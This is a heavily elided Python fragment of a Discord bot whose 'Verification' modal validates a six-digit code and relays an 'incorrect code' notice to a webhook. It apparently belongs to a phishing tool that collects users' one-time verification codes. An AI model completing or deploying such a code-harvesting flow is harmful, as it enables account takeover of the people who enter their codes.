...
class MyModalTwo(ui.Modal, title="Verification"):
    ...
    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        ...
        # NEW CODE: Validate code format before processing
        if not self.box_three.value.isdigit() or len(self.box_three.value) != 6:
        ...
        if data.get("webhook") is None:
            ...
            async with aiohttp.ClientSession() as session:
                ...
                if hasattr(config, 'INCORRECT_CODE') and config.INCORRECT_CODE:
                    ...
                    await webhook.send(embed=embed_incorrect_code, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                    ...
                    config.INCORRECT_CODE = False  # Reset the flag
                    return
